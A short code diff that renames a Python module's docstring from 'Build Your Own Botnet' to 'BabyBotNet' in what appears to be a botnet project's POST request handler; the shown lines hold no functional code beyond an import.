@@ -1,5 +1,5 @@
 #!/usr/bin/python
-'POST Request Handler (Build Your Own Botnet)'
+'POST Request Handler (BabyBotNet)'
 
 # standard library
 import os
